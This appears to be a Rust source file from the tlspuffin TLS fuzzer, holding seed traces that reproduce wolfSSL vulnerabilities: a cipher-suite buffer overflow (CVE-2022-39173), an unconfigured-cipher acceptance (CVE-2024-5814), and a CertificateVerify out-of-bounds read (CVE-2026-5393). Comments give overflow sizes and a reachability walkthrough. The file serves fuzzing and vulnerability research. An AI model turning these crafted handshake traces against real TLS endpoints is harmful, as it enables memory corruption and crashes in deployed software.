            fn_seq_0, // sequence restarts at 0 because we are decrypting now traffic
            fn_new_random,
            fn_cipher_suite13_aes_128_gcm_sha256
        )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };

    for _ in 0..149 {
        // 200 is too large already
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_128_gcm_sha256 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                 (fn_append_cipher_suite(
                   (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                  fn_cipher_suite13_aes_128_gcm_sha256
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                (fn_signature_algorithm_extension(
                                    (fn_supported_signature_schemes_extension_append(
                                        (fn_supported_signature_schemes_extension_append(
                                            fn_supported_signature_schemes_extension_new,
                                            fn_sig_scheme_rsa_pkcs1_sha256
                                        )),
                                        fn_sig_scheme_rsa_pss_sha256
                                    ))
                                ))
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_extension_make(
                            (fn_key_share_extension_append(
                                fn_key_share_extension_new,
                                (fn_key_share_deterministic(fn_named_group_secp384r1))
                            ))
                        ))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )))
    };

    let psk = term! {
        fn_derive_psk(
            (@server_hello_transcript),
            (@server_finished_transcript),
            (@client_finished_transcript),
            (fn_get_server_key_share(((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            (fn_get_ticket_nonce((@new_ticket_message))),
            fn_named_group_secp384r1,
            fn_new_random,
            fn_cipher_suite13_aes_128_gcm_sha256
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk),
            fn_cipher_suite13_aes_128_gcm_sha256
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    Trace {
        prior_traces: vec![initial_handshake],
        descriptors: vec![TLSDescriptorConfig::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @full_client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @full_client_hello
                    }
                }),
            },
        ],
        ..Default::default()
    }
}

pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TLSProtocolTypes> {
    // WAS REQUIRED: let initial_handshake = seed_client_attacker(initial_server);

    let new_ticket_message = term! {
        fn_new_session_ticket13(  // DUMMY resumption ticket
            (fn_payload_u8(fn_alice_cert)),
            (fn_payload_u16(fn_alice_cert)),
            (fn_new_session_ticket_extensions(fn_new_session_ticket_extensions_new))
        )
        // WAS:
        // fn_decrypt_application(
        //     ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
        //     (fn_server_hello_transcript(((initial_server, 0)))),
        //     (fn_server_finished_transcript(((initial_server, 0)))),
        //     (fn_get_server_key_share(((initial_server, 0)))),
        //     fn_no_psk,
        //     fn_named_group_secp384r1,
        //     fn_true,
        //     fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        // )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };
    for _ in 0..149 {
        // also works with 149, 150 leads a too large list of suites (as expected)
        // Maximum reached suitesSz value depending on the number of ciphers in the list:
        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
        // 11 -> suiteSz remains below 300
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_256_gcm_sha384 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                  (fn_append_cipher_suite(
                   (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                  // CHANGED FROM fn_cipher_suite13_aes_128_gcm_sha256
                  fn_cipher_suite13_aes_256_gcm_sha384
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                (fn_signature_algorithm_extension(
                                    (fn_supported_signature_schemes_extension_append(
                                        (fn_supported_signature_schemes_extension_append(
                                            fn_supported_signature_schemes_extension_new,
                                            fn_sig_scheme_rsa_pkcs1_sha256
                                        )),
                                        fn_sig_scheme_rsa_pss_sha256
                                    ))
                                ))
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_extension_make(
                            (fn_key_share_extension_append(
                                fn_key_share_extension_new,
                                (fn_key_share_deterministic(fn_named_group_secp384r1))
                            ))
                        ))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )))
    };

    Trace {
        // No more need for a prior trace and a full handshake.
        prior_traces: vec![], // WAS [initial_handshake],
        descriptors: vec![TLSDescriptorConfig::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
        ],
        ..Default::default()
    }
}

/// <https://nvd.nist.gov/vuln/detail/CVE-2024-5814>
pub fn seed_cve_2024_5814(client: AgentName) -> Trace<TLSProtocolTypes> {
    let selected_cipher_suite = term! { fn_excluded_cipher_suite };
    let server_hello = term! {
        fn_server_hello(
            fn_protocol_version12,
            fn_new_random,
            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
            (@selected_cipher_suite),      // Using a cipher not in configuration cipher string
            fn_compression,
            (fn_server_extensions_make(
                (fn_server_extensions_append(
                    fn_server_extensions_new,
                    (fn_renegotiation_info_server_extension((fn_payload_u8(fn_empty_bytes_vec))))
            ))))
        )
    };

    let server_hello_transcript = term! {
        fn_append_transcript(
            (fn_append_transcript(
                fn_new_transcript12,
                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
            )),
            (@server_hello) // plaintext ServerHello
        )
    };

    let server_certificate = term! {
        fn_certificate(
            (fn_append_certificate(
                fn_new_certificates,
                (fn_certificate_from_vec_u8(fn_alice_cert))
            ))
        )
    };

    let certificate_transcript = term! {
        fn_append_transcript(
            (@server_hello_transcript),
            (@server_certificate)
        )
    };

    let server_key_exchange = term! {
        fn_server_key_exchange(
            (fn_sign_rsa_ecdhe_server_key_exchange12(
                fn_named_group_secp384r1,
                ((client, 0)),
                fn_new_random,
                fn_alice_key
            ))
        )
    };

    let server_key_exchange_transcript = term! {
      fn_append_transcript(
            (@certificate_transcript),
            (@server_key_exchange)
        )
    };

    let server_hello_done_transcript = term! {
      fn_append_transcript(
            (@server_key_exchange_transcript),
            (fn_server_hello_done)
        )
    };

    let client_key_exchange_transcript = term! {
        fn_append_transcript(
            (@server_hello_done_transcript),
            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))])
        )
    };

    let client_ecdh_pubkey = term! {
        fn_decode_client_ecdh_pubkey(
            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>) // ClientECDHParams
        )
    };

    let client_finished_transcript = term! {
        fn_append_transcript(
            (@client_key_exchange_transcript),
            (fn_decrypt12( // Decrypt client finished
                ((client, 0)[Some(TlsQueryMatcher::Handshake(None))]), //EncryptedHandshake
                fn_new_random,
                (@client_ecdh_pubkey),
                fn_named_group_secp384r1,
                fn_false,
                fn_seq_0,
                ((client, 0)),
                (@selected_cipher_suite)
            ))
        )
    };

    let server_verify_data = term! {
        fn_server_sign_transcript(
            fn_new_random,
            (@client_ecdh_pubkey),
            (@client_finished_transcript),
            fn_named_group_secp384r1,
            ((client, 0)),
            (@selected_cipher_suite)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![TLSDescriptorConfig::new_client(client, TLSVersion::Both)],
        steps: vec![
            // Client Hello, Client -> Server
            OutputAction::new_step(client),
            // Server Hello, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { server_hello
                }),
            },
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { server_certificate
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { server_key_exchange
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! { fn_server_hello_done }
                }),
            },
            // Output messages from Client:
            // Client Key Exchange, Client -> Server
            // Client Change Cipher Spec, Client -> Server
            // Client Finished, Client -> Server

            // Server Change Cipher Spec, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! { fn_change_cipher_spec }
                }),
            },
            // Server Finished, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_encrypt12(
                            (fn_finished((@server_verify_data))),
                            fn_new_random,
                            (@client_ecdh_pubkey),
                            fn_named_group_secp384r1,
                            fn_false,
                            fn_seq_0,
                            ((client, 0)),
                            (@selected_cipher_suite)
                        )
                    }
                }),
            },
        ],
        ..Default::default()
    }
}


/// <https://nvd.nist.gov/vuln/detail/CVE-2026-5393>
///
/// Out-of-bounds read in `DoTls13CertificateVerify` of wolfSSL 5.9.0 built with
/// `--enable-experimental --enable-dual-alg-certs` (X9.146 dual-algorithm certificates), fixed in
/// 5.9.1 by commit 3bc72b5d27780f668ee34b1b38ac053665d49c6e
/// (in <https://github.com/wolfSSL/wolfssl/pull/10079>).
///
/// Root cause (CWE-125): when the CKS extension selected "both" signatures, the signature field of
/// a CertificateVerify holds two length-prefixed signatures. wolfSSL reads the first length at the
/// start of the field and the second one right after the first signature, without checking either
/// position against the signature field length. A crafted first length makes the second 2-byte
/// read land up to ~64 KiB past the message.
///
/// Versions: the CVE lists all versions < 5.9.1, but before 5.9.0 the vulnerable code is
/// unreachable: every CertificateVerify first had to use a signature algorithm from the receiver's
/// own list, which never contains the hybrid codes required for "both". 5.9.0 skips that check
/// for "both".
///
/// Reachability (malicious server, default client except for the build flags and a classical
/// group list, see the descriptor below):
/// - the client adopts an unsolicited CKS extension from EncryptedExtensions when it has no CKS
///   preference of its own ([`fn_cks_both_server_extension`]);
/// - the server certificate must carry an alternative public key of the type named by the hybrid
///   scheme: [`fn_alice_dual_alg_cert`] is issued by the trusted `alice.pem` and carries an
///   ML-DSA-44 key, which the client decodes before the vulnerable read;
/// - the CertificateVerify uses the hybrid scheme RSA-PSS + ML-DSA-44 (0xFEA2) and a signature
///   field starting with a large first length. Its signatures are never checked: the
///   out-of-bounds read happens first.
pub fn seed_cve_2026_5393(client: AgentName) -> Trace<TLSProtocolTypes> {
    let curve = term! {
        fn_get_any_client_curve(
            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))])
        )
    };

    let server_hello = term! {
          fn_server_hello(
            fn_protocol_version12,
            fn_new_random,
            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
            fn_cipher_suite13_aes_128_gcm_sha256,
            fn_compression,
            (fn_server_extensions_make(
              (fn_server_extensions_append(
                  (fn_server_extensions_append(
                      fn_server_extensions_new,
                      (fn_key_share_server_extension(
                          (fn_key_share_deterministic((@curve)))
                      ))
                  )),
                  fn_supported_versions13_server_extension
            ))))
        )
    };

    let server_hello_transcript = term! {
        fn_append_transcript(
            (fn_append_transcript(
                fn_new_transcript,
                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
            )),
            (@server_hello) // plaintext ServerHello
        )
    };

    // CKS "both": the client adopts it although it did not send a CKS extension
    let encrypted_extensions = term! {
        fn_encrypted_extensions(
            (fn_server_extensions_append(
                fn_server_extensions_new,
                fn_cks_both_server_extension
            ))
        )
    };

    let certificate = term! {
        fn_certificate13(
            (fn_payload_u8((fn_empty_bytes_vec))),
            (fn_certificate_entries_make(
                (fn_chain_append_certificate_entry(
                  fn_empty_certificate_chain,
                  (fn_certificate_entry_extensions(
                    fn_alice_dual_alg_cert,
                    (fn_cert_extensions_make(
                        fn_cert_extensions_new
                    ))
            ))))
            ))
        )
    };

    // The signature field only holds a large first length: the second length is read past the end
    // of the WOLFSSL object holding the input buffer (see fn_large_u16_length_bytes).
    let certificate_verify = term! {
        fn_certificate_verify(
            fn_sig_scheme_hybrid_rsa_pss_mldsa44,
            (fn_payload_u16(fn_large_u16_length_bytes))
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            TLSDescriptorConfig {
                tls_version: TLSVersion::V1_3,
                typ: AgentType::Client,
                // Unrelated to the bug: wolfSSL >= 5.9.1 enables ML-KEM by default and sends its
                // first key share for X25519MLKEM768, which tlspuffin cannot compute. Restricting
                // the groups keeps the trace identical on the vulnerable 5.9.0 and the fixed 5.9.1.
                groups: Some(String::from("P-256:P-384")),
                ..TLSDescriptorConfig::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            Step {
                agent: client,
                action: Action::Input(input_action! { server_hello
                }),
            },
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@encrypted_extensions),
                            (@server_hello_transcript),
                            (fn_get_client_key_share(((client, 0)), (@curve))),
                            fn_no_psk,
                            (@curve),
                            fn_false,
                            fn_seq_0,  // sequence 0
                            fn_new_random,
                            fn_cipher_suite13_aes_128_gcm_sha256
                        )
                    }
                }),
            },
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@certificate),
                            (@server_hello_transcript),
                            (fn_get_client_key_share(((client, 0)), (@curve))),
                            fn_no_psk,
                            (@curve),
                            fn_false,
                            fn_seq_1,  // sequence 1
                            fn_new_random,
                            fn_cipher_suite13_aes_128_gcm_sha256
                        )
                    }
                }),
            },
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@certificate_verify),
                            (@server_hello_transcript),
                            (fn_get_client_key_share(((client, 0)), (@curve))),
                            fn_no_psk,
                            (@curve),
                            fn_false,
                            fn_seq_2,  // sequence 2
                            fn_new_random,
                            fn_cipher_suite13_aes_128_gcm_sha256
                        )
                    }
                }),
            },
        ],
        ..Default::default()
    }
}

#[cfg(test)]
pub mod tests {
    use puffin::algebra::TermType;
    use puffin::fuzzer::utils::TermConstraints;

    #[allow(unused_imports)]
    use crate::{test_utils::prelude::*, tls::vulnerabilities::*};

    #[test_log::test]
    fn test_term_sizes() {
        let client = AgentName::first();
        let _server = client.next();

        for (name, trace) in [
            seed_cve_2022_25638.build_named_trace(),
            seed_cve_2022_25640.build_named_trace(),
            seed_cve_2021_3449.build_named_trace(),
            // seed_heartbleed.build_named_trace(),
            seed_freak.build_named_trace(),
            seed_cve_2022_25640_simple.build_named_trace(),
            seed_cve_2022_38153.build_named_trace(),
            seed_cve_2026_5393.build_named_trace(),
            // TODO: 685 seed_cve_2022_39173.build_named_trace(),
            // TODO: 1695 seed_cve_2022_39173_full.build_named_trace(),
            // TODO: 322 seed_cve_2022_39173_minimized.build_named_trace(),
        ] {
            for step in &trace.steps {
                match &step.action {
                    Action::Input(input) => {
                        // a seed step recipe must fit the per-step result cap, else the
                        // corpus boundary is misconfigured (see max_result_term_size)
                        let terms = input.recipe.size();
                        assert!(
                            terms < TermConstraints::default().max_result_term_size,
                            "{} has step with too large term size {}!",
                            name,
                            terms
                        );
                    }
                    Action::Output(_) => {}
                }
            }
        }
    }
}
